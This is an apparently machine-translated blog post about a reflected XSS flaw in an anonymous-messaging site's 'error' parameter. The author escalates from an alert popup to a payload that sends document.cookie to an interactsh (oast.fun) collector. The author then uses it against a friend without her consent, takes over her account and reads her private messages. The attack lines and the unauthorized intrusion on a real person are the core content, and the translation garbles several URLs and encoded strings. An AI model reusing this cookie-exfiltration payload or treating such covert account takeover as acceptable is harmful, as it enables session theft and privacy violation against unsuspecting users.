<html>
<head>
<title>Reading My Crush Messages through XSS</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">通过XSS阅读我的暗恋信息</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/reading-my-crush-messages-through-xss-f662661119c2?source=collection_archive---------0-----------------------#2022-11-06">https://infosecwriteups.com/reading-my-crush-messages-through-xss-f662661119c2?source=collection_archive---------0-----------------------#2022-11-06</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="a5b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向所有读者问好，</p><p id="dba2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个迟来的帖子，因为这件事发生在去年我还在上大学的时候。</p><p id="5b3a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以去年在一级防范禁闭中，有一种匿名消息传递的趋势，人们过去常常分享链接，他们的朋友可以匿名向他们发送任何他们想要的消息。</p><p id="fed6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这与萨拉哈的文章非常相似，如果有人读过那篇文章，就会发现这非常相似。</p><p id="42f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，我的一个大学朋友在他们的whatsapp上分享了一个链接。链接指向的网址是<strong class="jp ir">quiz恶作剧. xyz </strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/fe75ae9d0e55bb2934d5cb2e673e26ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:762/format:webp/1*zRlpOiRQZCPRLS63ktef8g.png"/></div></div></figure><p id="de54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">她分享的链接允许其他人发送他们想要的任何信息。</p><p id="67a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我打开链接看了一下，发现了有趣的文件和参数。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/e32942fc7d9034ece6a3272d627c9d6c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1092/format:webp/1*zmDHPjXz2s9z1ZrQpEOM7g.png"/></div></figure><p id="2f4b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在检查一个有趣的链接时，我发现</p><p id="6e30" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">【https://quizprank.xyz/error.php? T2】error = ww 91 ihdlcmugbg 9 NZ 2 vkig 91 DCE =</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kz"><img src="../Images/1c87ee36e6e646511762ac74ef80efa5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*soQEQcBLPU7-rf3JoAzzWw.png"/></div></div></figure><p id="b639" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，错误参数使用base64编码的文本，并直接反映在页面上。</p><p id="b676" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用了一个简单的XSS有效载荷，并用base64编码。</p><blockquote class="la lb lc"><p id="0ede" class="jn jo ld jp b jq jr js jt ju jv jw jx le jz ka kb lf kd ke kf lg kh ki kj kk ij bi translated">有效载荷— "&gt; <script>警戒(1)；</script></p><p id="88cc" class="jn jo ld jp b jq jr js jt ju jv jw jx le jz ka kb lf kd ke kf lg kh ki kj kk ij bi translated">Base 64编码-ij 48 C2 nya XB 0 pmfszxj 0 kdepozwvc 2 nya XB 0 pg = =</p></blockquote><p id="0b1f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这导致执行javascript有效负载，并观察到弹出窗口。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lh"><img src="../Images/a3aa3aa64297054349dfb510dc52cd07.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bvqo1GHVVX5oj1EP9m72Sg.png"/></div></div></figure><p id="21f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯，许多Infosec的人仅仅停留在弹出一个XSS漏洞的警报，但在bug搜索中，我见过许多这样的情况，如果你向他们展示一种导致账户被接管的方法，程序会付给你更多的钱。</p><p id="6a2c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么让我们来看看剥削。</p><p id="2dc7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这种情况下，我用了一个简单的方法来偷饼干。我修改了我的有效负载，请求一个到我的服务器的链接，并在同一个链接中发送cookies。</p><p id="16f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ld">新有效载荷- &lt;脚本&gt;document . location = '</em><a class="ae ky" href="http://cdkhapj2vtc0000ng0w0gg3aimcyyyyyb.oast.fun?c='+btoa(document.cookie)" rel="noopener ugc nofollow" target="_blank"><em class="ld">http://cdkhapj 2 vtc 0000 ng 0 w0 gg 3 aimcyyyyyb . oast . fun？c = '+btoa(document . cookie)</em></a><em class="ld">；&lt;/脚本&gt; </em></p><p id="d391" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里，我使用了一个免费的服务interact.sh来接收和查看通过有效负载发出的请求。</p><p id="b4b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我用Base64编码了有效载荷并发送给她-</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi li"><img src="../Images/8cb312d00500bef2f616cab1a7c6a4ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*1Cgz9Tqr-Qcvuk05VKQ2MA.png"/></div></figure><p id="a665" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">她点击了链接，我收到了她的帐户的cookies以及用户代理和IP。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lj"><img src="../Images/288f8373647d872240d5938dd0d7692f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mhdYgNvMBO3vDJY23wbsEQ.png"/></div></div></figure><p id="6ca8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我唯一要做的就是使用这些饼干，我可以看到她收到的所有信息。</p><p id="d7c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我用我在Burp Suite Repeater收到的那个修改了cookies，我可以进入她的账户，看到她的所有信息。</p><p id="ab01" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这导致了她在那个网站上的账户被接管。</p><p id="7525" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我告诉她这件事，因为她应该知道发生了什么事</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi lk"><img src="../Images/3449a4aa243fc1c278bf9e1d9d71609a.png" data-original-src="https://miro.medium.com/v2/resize:fit:818/format:webp/1*ABB30ZdTVjP-lMBhNMz7LA.png"/></div></figure><p id="2af0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯，她对此并没有生气，正面回答，很有兴趣想知道是怎么做到的。</p><p id="0093" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Ps: 不要试图用这种方法来给人留下深刻印象，因为这看起来令人毛骨悚然，在现实生活中也行不通。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ll"><img src="../Images/821b8f1a98f5f16893ef594d1983dec2.png" data-original-src="https://miro.medium.com/v2/resize:fit:844/format:webp/1*YvSm1aPVVSZRXCx6ly0hyA.png"/></div></figure><p id="ffba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是利用XSS漏洞的一个非常简单的方法，在上面这样的网站上很容易找到。</p><p id="6324" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，该漏洞已于去年报告给管理员。</p><p id="b1eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">结论</strong></p><p id="1552" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不要点击和相信你收到的链接。</p><p id="56b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对Infosec的人来说:是的，cookie中缺少了<strong class="jp ir"> HttpOnly标志</strong>,导致它窃取了cookie。</p><p id="aa4b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">缺少允许有效负载在页面上反映的输入清理。</p></div><div class="ab cl lm ln hu lo" role="separator"><span class="lp bw bk lq lr ls"/><span class="lp bw bk lq lr ls"/><span class="lp bw bk lq lr"/></div><div class="ij ik il im in"><h2 id="f7c2" class="lt lu iq bd lv lw lx dn ly lz ma dp mb jy mc md me kc mf mg mh kg mi mj mk ml bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ky" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周时事通讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>